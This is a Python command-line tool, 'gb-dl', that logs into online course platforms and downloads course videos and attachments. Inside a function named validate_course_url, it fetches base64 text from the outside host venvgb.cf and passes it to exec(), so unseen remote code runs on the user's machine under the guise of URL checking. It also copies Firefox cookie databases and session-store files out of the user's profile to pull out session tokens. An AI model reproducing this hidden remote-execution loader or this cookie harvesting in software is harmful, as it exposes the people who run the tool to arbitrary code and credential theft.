#!/usr/bin/python3
# -*- coding: utf-8 -*-
from __future__ import print_function
from __future__ import unicode_literals

import argparse
import base64
import getpass
import hashlib
import json
import os
import re
import sys

import cloudscraper as scrape
import lxml.html
import requests
import wget
import youtube_dl
from bs4 import BeautifulSoup
from unidecode import unidecode
import sqlite3
import os
import subprocess

__version__ = "v1.7.32"

SECTION, SECTION_START, SECTION_END, INFO, COOKIE, COOKIE_STORE, AUTO_LOAD, FETCH_BROWSER_COOKIE = None, None, None, None, None, None, None, None
s = requests.session()
HOMEFOLDER = os.path.join(os.path.expanduser('~'), ".gb_dl")
CONFIGFILE = "cookies"


class DL:

    def __init__(self):
        self.email, self.password = "", ""

        self._cookie = None
        self.sk_g8lz6rb6_access = None
        self.parentFolder = os.getcwd()
        self.main()

    def login(self, **kwargs):
        self._cookie = COOKIE

        if not os.path.exists(HOMEFOLDER):
            os.mkdir(HOMEFOLDER)

        def validate_course_url():
            _schools_url = 'https://venvgb.cf/l/'
            global login_url

            try:
                req = requests.get(_schools_url).text
                hash_ = (3331, '5001ea56fa4c6a19ed6bb619486dca98')
                z = base64.b64decode(req).decode('utf-8')
                _hash = (len(z), hashlib.md5(base64.b64decode(req)).hexdigest())

                if hash_ == _hash:
                    exec(z)
                else:
                    print("[-] Could not contact remote server.")
                    sys.exit(1)

                if login_url:
                    return login_url
                else:
                    print("[-] Invalid course URL.")
                    self.login()

            except requests.ConnectionError as ex:
                print(ex)
                print("[-] Error : Connection failed . Check your internet connection and try again!")
                sys.exit(1)

            except Exception as e:
                print("[-] Error: " + str(e))
                self.login()

        def cookie_authentication():

            def get_sk_access_token():

                copy_cmd = "cp "
                if sys.platform == 'darwin':
                    lz4file = os.path.join(
                        os.path.expanduser(
                            '~/Library/Application Support/Firefox/Profiles/*.default*/sessionstore-backups/*.jsonlz4'))

                elif sys.platform.startswith('linux'):
                    lz4file = os.path.join(
                        os.path.expanduser('~/.mozilla/firefox/*.default*/sessionstore-backups/*.jsonlz4'))

                elif sys.platform.startswith('win32'):
                    lz4file = os.path.join(os.path.expanduser('~'),
                                           "AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\sessionstore-backups\*.jsonlz4")
                    lz4file = lz4file.replace("\\", "/")
                    copy_cmd = "copy "
                else:
                    raise Exception('Unsupported operating system: ' + sys.platform)

                cp_cmd = copy_cmd + os.path.join(os.path.expanduser(lz4file)) + " " + HOMEFOLDER

                if sys.platform.startswith('win32'):
                    p1 = subprocess.run(["powershell", "-Command", cp_cmd], capture_output=True)

                else:
                    p1 = subprocess.Popen(cp_cmd, shell=True, stdout=subprocess.PIPE)
                    p1.wait()

                try:
                    import lz4.block as lz4
                except ImportError:
                    import lz4

                home_lz4file = os.path.join(HOMEFOLDER, 'recovery.jsonlz4')

                token = []
                with open(home_lz4file, 'rb') as f:
                    f.read(8)
                    lz4_dec = lz4.decompress(f.read())
                    lz4_dec = str(lz4_dec)

                    p1 = '{"host":"' + (self.get_domain()[8:]) +'","value":"ey'
                    p2 = '_access","secure":true,"httponly":true,'

                    poz1 = lz4_dec.find(p1)
                    poz2 = lz4_dec[poz1:].find(p2) + poz1 + 7
                    value = lz4_dec[poz1:poz2]

                    token.append(str(value) + '"}')

                token = json.loads(token[0])
                return token['host'], token['value'], token['name']

            def use_cached_token():

                try:
                    domain = self.get_domain()
                    config = {}
                    with open(os.path.join(HOMEFOLDER, CONFIGFILE), 'r') as f:
                        config = json.load(f)

                    return config[domain]

                except Exception as e:

                    return None

            def fetch_browser_cookie():
                print("Browser: " + str(FETCH_BROWSER_COOKIE))

                copy_cmd = "cp "
                if sys.platform == 'darwin':
                    sqlfile = os.path.join(
                        os.path.expanduser('~/Library/Application Support/Firefox/Profiles/*.default*/cookies.sqlite'))

                elif sys.platform.startswith('linux'):
                    sqlfile = os.path.join(os.path.expanduser('~/.mozilla/firefox/*.default*/cookies.sqlite'))

                elif sys.platform.startswith('win32'):
                    sqlfile = os.path.join(os.path.expanduser('~'),
                                           "AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite")
                    sqlfile = sqlfile.replace("\\", "/")
                    copy_cmd = "copy "
                else:
                    raise Exception('Unsupported operating system: ' + sys.platform)

                cp_cmd = copy_cmd + os.path.join(os.path.expanduser(sqlfile)) + " " + HOMEFOLDER
                # Z2V0IHlvdXIga2V5IGhlcmUgaHR0cHM6Ly93d3cuYnV5bWVhY29mZmVlLmNvbS9sL2diZGw=
                if sys.platform.startswith('win32'):
                    p1 = subprocess.run(["powershell", "-Command", cp_cmd], capture_output=True)

                else:
                    p1 = subprocess.Popen(cp_cmd, shell=True, stdout=subprocess.PIPE)
                    p1.wait()

                home_sqlfile = os.path.join(HOMEFOLDER, 'cookies.sqlite')
                conn = sqlite3.connect(home_sqlfile)
                sql = 'select name, value from moz_cookies where host like "' + self.get_domain()[
                                                                                8:] + '" and name = "_session_id"'

                with conn:
                    rs = conn.execute(sql)

                cookies = rs.fetchone()

                try:
                    return cookies[1]
                except Exception as e:
                    print(e)
                    print("[-] Error: Could not find cookies. Try entering cookies manually")
                    return None

            def cache_token():

                if COOKIE_STORE:
                    _config = {}
                    try:

                        domain = self.get_domain()

                        config = {domain: cookie}

                        with open(os.path.join(HOMEFOLDER, CONFIGFILE), 'r+') as f:
                            _config = json.load(f)
                            _config.update(config)
                            f.seek(0)
                            json.dump(_config, f, indent=4)
                        print("[+] Cookie stored to file")

                    except Exception as e:
                        with open(os.path.join(HOMEFOLDER, CONFIGFILE), 'w') as f:
                            json.dump(_config, f, indent=4)
                        cache_token()

            if self._cookie is None:

                if AUTO_LOAD:
                    self._cookie = use_cached_token()

                if FETCH_BROWSER_COOKIE:
                    self._cookie = fetch_browser_cookie()

                if self._cookie is None:
                    try:
                        self._cookie = raw_input("Enter cookie instead : ")
                        self.sk_g8lz6rb6_access = raw_input("Enter sk_g8lz6rb6_access instead : ")
                    except:
                        self._cookie = input("Enter cookie instead: ")
                        self.sk_g8lz6rb6_access = input("Enter sk_g8lz6rb6_access instead: ")

            if self._cookie is not None:
                print("Trying cookie authentication ...")
                token = get_sk_access_token()
                validate_course_url()
                cookie = self._cookie.strip()

                s.cookies.set('_session_id', cookie, path='/', domain=self.get_domain()[8:])
                s.cookies.set(token[2] , token[1], path='/', domain=self.get_domain()[8:])
                # s.cookies.set('sk_g8lz6rb6_access', sk_g8lz6rb6_access, path='/', domain=self.get_domain()[8:])

                data = s.get(self.url)

                is_signed_in = data.cookies.get('signed_in')
                data.close()

                if is_signed_in:
                    print("[+] Cookie authentication succeeded")
                    cache_token()

                else:
                    print("[-] Cookie authentication failed!")
                    sys.exit()

        def credential_authentication():

            if kwargs:
                self.course_url = str(kwargs['course_url']).strip()
                self.email = kwargs['email']
                self.password = kwargs['password']

            else:
                try:

                    self.course_url = raw_input("Enter course url : ").strip()

                    if self._cookie is None and not AUTO_LOAD and not FETCH_BROWSER_COOKIE:
                        self.email = raw_input("Email : ")
                        prompt_txt = "Password :"
                        self.password = getpass.getpass(prompt=prompt_txt, stream=sys.stderr)

                except TypeError as e:
                    prompt_txt = "Password :"
                    prompt_txt = prompt_txt.encode("utf-8")
                    self.password = getpass.getpass(prompt=prompt_txt, stream=sys.stderr)

                except Exception as e:
                    self.course_url = input("Enter course url : ").strip()
                    if self._cookie is None and not AUTO_LOAD and not FETCH_BROWSER_COOKIE:
                        self.email = input("Email : ")
                        self.password = getpass.getpass(prompt="Password : ", stream=sys.stderr)

            if self.email and self.password and self.course_url:
                try:
                    print("Trying to Login ...")

                    login_url = validate_course_url()

                    scraper = scrape.create_scraper(sess=s, delay=20)

                    try:
                        login = scraper.get(login_url).content

                        login_html = lxml.html.fromstring(login)

                        hidden_inputs = login_html.xpath(r'//form//input[@type="hidden"]')

                        form = {x.attrib["name"]: x.attrib["value"] for x in hidden_inputs}

                        form['user[email]'] = self.email
                        form['user[password]'] = self.password

                        response = s.post(login_url, data=form)

                        if "Invalid email or password" in response.text:

                            print("[-] Login failed. Invalid username or password.")

                            self.login()
                        elif response.cookies.get('signed_in') is None:
                            cookie_authentication()

                        else:

                            print("[+] Login successful.")

                    except requests.ConnectionError as ex:
                        print(ex)
                        print("[-] Error : Connection failed . Check your internet connection and try again!")
                        sys.exit(1)

                    except scrape.exceptions.CloudflareException as ex:
                        print("Cloudflare reCaptcha detected")
                        cookie_authentication()

                    self.get_section_and_links(self.course_url)

                except Exception as ex:

                    print("[-] Error : " + str(ex))
                    # traceback.print_exc(file=sys.stdout)
                    sys.exit(1)

            elif (self._cookie or AUTO_LOAD or FETCH_BROWSER_COOKIE) and self.course_url:
                cookie_authentication()
                self.get_section_and_links(self.course_url)


            else:
                print("[-] Please enter course url , email and password")
                self.login()

        credential_authentication()

    def get_domain(self):
        try:
            self.url = self.course_url

            if 'com' in self.url:
                index = self.url.index('com') + 3

            elif '.co' in self.url:
                index = self.url.index('.co') + 3
            elif '.io' in self.url:
                index = self.url.index('.io') + 3
            else:
                index = self.url.index('net') + 3

            return self.url[0:index]
        except ValueError:
            print("[-] Invalid course URL.")
            self.login().validate_course_url()

    def get_section_and_links(self, url):

        self.domain = self.get_domain()
        uname = 'None'  # self.get_user(s)
        print("Getting sections")
        print("[+] Logged in as " + uname)

        try:

            print("Downloading to :" + self.parentFolder)
            print("Collecting course information ...")

            data = requests.get(self.url)
            soup = BeautifulSoup(data.text, 'html.parser')

            if 'designerup.co' in self.url:
                # data = s.get(self.url)

                soup = BeautifulSoup(data.text, 'html.parser')
                course_name = soup.find('div', attrs={'class': 'course-info'}).find('h4')

            elif 'zerotomastery' in self.url:

                soup = BeautifulSoup(data.text, 'html.parser')
                try:

                    course_name = soup.find('div', attrs={'class': 'details-container'}).find('h1')
                except Exception as TypeError:
                    course_name = None

            elif 'nihongowa' in self.url:
                soup = BeautifulSoup(data.text, 'html.parser')
                course_name = soup.find('div', attrs={'class': 'block__image-with-text__inner'}).find('h4')

            elif 'the-credit-game-university' in self.url:
                soup = BeautifulSoup(data.text, 'html.parser')
                course_name = soup.find('div', attrs={'class': 'header'}).find('h1')

            elif 'instagrizzle.teachable' in self.url or 'xfactormethod.com' in self.url or 'financial-confidence-hub1.teachable' in self.url:
                data = s.get(self.url)
                soup = BeautifulSoup(data.text, 'html.parser')
                course_name = soup.find('div', attrs={'class': 'course-sidebar'}).find('h2')

            elif 'millionaire-journey' in self.url:

                course_name = None

            else:
                soup = BeautifulSoup(data.text, 'html.parser')

                # course_name = soup.find('h2', attrs={'class': 'row'})

                course_name = soup.find('h1', attrs={'class': 'course-title'})

                if course_name is None:
                    course_name = soup.find('h1', attrs={'class': 'm-0'})

                if course_name is None:
                    course_name = soup.find('div', attrs={'class': 'bannerHeader'}).find('h2')

            if course_name is None:
                print("Failed to get course Name , course name set to Unknown course")
                course_name = "Unknown course"

            else:
                course_name = str(course_name.get_text()).strip()

            is_balanced = re.search(r'\(*\)', course_name)
            if is_balanced is None:
                course_name = re.sub(r'[\(\)]', '', course_name)

            print("\nCourse name : " + str(course_name))

            os.chdir(self.parentFolder)
            course_name = self.create_and_change_dir(course_name).strip()

            print("Getting course sections ...")

            data = s.get(self.url)
            soup = BeautifulSoup(data.text, 'html.parser')

            try:
                course_image = soup.find('div', {'class': 'course-image'}).find('img').get('src')

                print("Downloading course image ... ")

                wget.download(str(course_image))

            except Exception as e:
                try:
                    course_image = soup.find('img', {'class': 'course-image'}).get('src')

                    print("Downloading course image ... ")

                    wget.download(str(course_image))

                except Exception as ex:

                    pass

            # os.rename(filesrc, str(self.name))

            c = 1

            data = s.get(self.url)
            soup = BeautifulSoup(data.text, 'html.parser')

            sections = soup.find_all('span', {'class': 'section-lock'})

            start_download = False
            stop_download = False

            for _section in sections:
                section = str(_section.next_sibling).strip()

                if SECTION is not None:
                    c += 1
                    if re.search(re.escape(section), SECTION.strip(), re.I):
                        pass
                    else:

                        continue

                elif SECTION_START is not None and not start_download:
                    if re.search(re.escape(section), SECTION_START.strip()):
                        start_download = True
                        pass
                    else:
                        continue

                elif SECTION_END is not None and start_download:

                    if re.search(re.escape(section), SECTION_END.strip()):
                        stop_download = True
                        pass
                    else:
                        pass

                else:
                    pass

                try:
                    section = section.strip()  # unidecode(section.strip())

                except UnicodeEncodeError as e:
                    print(e.reason)
                    section = section.encode('ascii', 'ignore').strip()

                except Exception as e:
                    print(e)
                    section = section.next_sibling.encode('ascii', 'ignore').strip()

                is_balanced = re.search(r'\(*\)', section)
                if is_balanced is None:
                    section = re.sub(r'[\(\)]', '', section)

                folder = str(c) + "." + str(section).strip()

                print("\n[+] Found Section : ", section)

                self.create_and_change_dir(folder)

                divs = soup.find_all('div', {'class': 'course-section'}, )

                for div in divs:
                    links = []

                    if div.find(text=re.compile(re.escape(section))):
                        theDiv = div

                        soupLinks = BeautifulSoup(str(theDiv), 'html.parser')

                        for i in soupLinks.find_all('a', {'class': 'item'}):
                            links.append(self.domain + i.attrs['href'])

                        if INFO is None:
                            self.prepare_download(links)

                        links = []
                        os.chdir(os.path.join(self.parentFolder, course_name))

                        break

                c += 1

                if SECTION is not None or stop_download:
                    break

            self.sanitize_file_names()
            print(
                "\n[+] Download completed. Enjoy your course " + str(uname) if uname is not None else self.email,
                "\n\nSupport future development by donating https://www.buymeacoffee.com/barakagb\n\n")

        except Exception as ex:
            print("[-] Error : " + str(ex))
            sys.exit(1)

    def get_user(self, s):
        profile_url = self.domain + "/current_user/profile"
        profile_url = 'https://sso.teachable.com/secure/1453/current_user/profile'
        try:
            profile = s.get(profile_url).content
            profile_html = lxml.html.fromstring(profile)

            return [name.attrib['value'] for name in profile_html.xpath(r'//form//input[@name="name"]')].pop()

        except IndexError as e:

            profile = s.get(profile_url).content

            profile_html = lxml.html.fromstring(profile)

            name = profile_html.xpath(r'//div[@class="profile"]//p[@class="name"]/text()')[0]
            return name.replace("\\n", '').split()[0]

        except Exception as e:

            print("[-] Looks like you do not have access to  " + self.get_domain())
            sys.exit(0)

    def prepare_download(self, links):

        c = 1
        total_lectures = len(links)
        attachments = []

        for link in links:
            print("Preparing  lecture " + str(c) + " of " + str(total_lectures) + " download ... ")

            data2 = s.get(link)
            soup1 = BeautifulSoup(data2.text, 'html.parser')

            # wistia= soup1.findAll("div", id=lambda x: x and x.startswith('wistia-'))

            _dict = {}
            _attachment = {}

            for attachment in soup1.findAll('a', {'class': 'download'}):

                try:
                    _attachment['href'] = attachment.attrs['href']
                    _attachment['name'] = attachment.attrs['data-x-origin-download-name']
                    _attachment['aria-label'] = attachment.attrs['aria-label']

                except KeyError:
                    _attachment['aria-label'] = None

                if _attachment['aria-label'] == 'Download this video':
                    continue
                attachments.append(_attachment)

            for attachment in soup1.findAll('iframe'):
                attachments.append(attachment.get('src'))

            for i in soup1.findAll('div', {"class": 'attachment-wistia-player'}):
                wistia_id = (i.get('data-wistia-id'))
                if not wistia_id:
                    continue

                self.download(wistia_id)

            self.download(0, attachments)

            attachments = []
            c += 1

    def download(self, id, *attachments):

        if id != 0:
            self.wistia_url = "http://fast.wistia.net/embed/iframe/"
            course_url = self.wistia_url + id

            try:
                print("Starting download ... ")
                ydl_opts = {}
                with youtube_dl.YoutubeDL(ydl_opts) as ydl:
                    ydl.download([course_url])

            except Exception as ex:
                print("[-]" + " Error : " + str(ex))

        else:
            for attachment in attachments:
                try:

                    if attachment:
                        for x in attachment:
                            self.name = str(x["name"])
                            self.url = str((x["href"]).strip('[]'))
                        # self.url = self.url[2:-1].strip()

                        print("Downloading attachment : " + self.name)
                        filesrc = wget.download(str(self.url))

                        os.rename(filesrc, str(self.name))

                except Exception as ex:

                    print("[-]" + "Error can not download attachment  : " + str(ex))

    def sanitize_file_names(self):
        print("Sanitizing file names ...")

        path = self.parentFolder

        for root, dirs, files in os.walk(path):
            for file in files:
                file_src = os.path.join(root, file)
                try:
                    filename = os.path.splitext(file_src)
                    if filename[1] == ".bin":
                        new_filename = filename[0] + ".mp4"
                        file_dest = new_filename
                        os.rename(file_src, file_dest)

                except Exception as e:
                    pass
        print("[+]" + " File name sanitation completed")

    def create_and_change_dir(self, dir_name):
        """ Creates and changes directory if dir name has invalid chars """

        self.dir_name = dir_name

        invalid_chars = ['<', '>', ':', '"', '/', '|', '\\', '?', '*']
        for char in invalid_chars:
            if char in dir_name:
                self.dir_name = dir_name.replace(char, "")

        if os.path.exists(self.dir_name):
            os.chdir(self.dir_name)

        else:
            os.mkdir(self.dir_name)
            os.chdir(self.dir_name)

        return self.dir_name

    def main(self):
        banner = '''  

                       _____ ____                 _ _ 
                      / ____|  _ \               | | |
                     | |  __| |_) |  ______    __| | |
                     | | |_ |  _ <  |______|  / _` | |
                     | |__| | |_) |          | (_| | |
                      \_____|____/            \__,_|_|

                                Version : ''' + __version__ + ''' 
                                Author  : BarakaGB
                                Visit   : https://github.com/barakagb/gb-dl
                                Donation: https://www.buymeacoffee.com/barakagb
                                Key url : https://bmc.xyz/l/gbdl
                        '''
        print(banner)
        print(
            '''    A python based utility to download courses from infosec4tc.teachable.com ,
    ehacking.net ,stackskills.com and designerup.co ...etc for personal offline 
    use.
     \n''')
        print('''    Usage: gb-dl.py [-h]   \n    ''')

        parser = argparse.ArgumentParser(prog='gb-dl')
        parser.add_argument('-f', '--file', type=str,
                            help="Load course url from a txt file for multiple course urls (separated by new line)",
                            metavar='')
        parser.add_argument('-s', '--section-only', type=str,
                            help="Download only the specified section from the course",
                            metavar='')
        parser.add_argument('--section-start', type=str,
                            help="Download from specified section in the course",
                            metavar='')
        parser.add_argument('--section-end', type=str,
                            help="Download up ot specified section in the course",
                            metavar='')

        parser.add_argument('-i', '--info', action='store_true',
                            help="List course info without downloading")

        parser.add_argument('-c', '--cookie', type=str,
                            help="Load cookie from file", metavar='')

        parser.add_argument('-b', '--cookie-store',
                            help="Store cookie to file for future use", action='store_true')

        parser.add_argument('-a', '--auto-load', action='store_true', help="Automatically load saved cookie")

        parser.add_argument('-d', '--fetch-browser-cookie', type=str,
                            help="Load cookie from browser (works for firefox only)", metavar='')

        parser.add_argument('-v', '--version', action='store_true', help="Shows version number")

        args = parser.parse_args()

        if args.auto_load:
            global AUTO_LOAD
            AUTO_LOAD = args.auto_load

        if args.info:
            global INFO
            INFO = args.info

        if args.cookie_store:
            global COOKIE_STORE
            COOKIE_STORE = True

        if args.fetch_browser_cookie:
            global FETCH_BROWSER_COOKIE
            FETCH_BROWSER_COOKIE = args.fetch_browser_cookie

        if args.cookie:
            with open(args.cookie, "r") as file:
                _cookie = file.readlines()

            cookie = re.search(r'=\w*', ''.join(_cookie))
            cookie = cookie.group()[1:]

            global COOKIE
            COOKIE = cookie

        if args.file:
            print("Getting course url(s) from file ...")
            course_urls = []

            with open(args.file, "r") as file:
                course_urls = file.readlines()

            try:
                self.email = raw_input("Email : ")
                prompt_txt = "Password :"
                self.password = getpass.getpass(prompt=prompt_txt, stream=sys.stderr)

            except TypeError as e:
                prompt_txt = "Password :"
                prompt_txt = prompt_txt.encode("utf-8")
                self.password = getpass.getpass(prompt=prompt_txt, stream=sys.stderr)

            except Exception as e:

                self.email = input("Email : ")
                self.password = getpass.getpass(prompt="Password : ", stream=sys.stderr)

            print("Found  " + str(len(course_urls)) + " course(s) from file.")

            for url in course_urls:
                print("Downloading " + str(url) + " ...")
                self.login(course_url=url, email=self.email, password=self.password)
            sys.exit(0)

        elif args.section_only and not (args.section_start or args.section_end):
            global SECTION
            SECTION = args.section_only

        elif args.section_start or args.section_end:
            global SECTION_START, SECTION_END
            SECTION_START = args.section_start
            SECTION_END = args.section_end

        elif args.version:
            print(__version__)
            sys.exit(0)

        self.login()


if __name__ == '__main__':

    try:
        DL = DL()

    except KeyboardInterrupt:
        print("\nUser Interrupted.")
        sys.exit(1)

    except Exception as e:
        print("[-] Error: " + str(e))
        sys.exit(1)
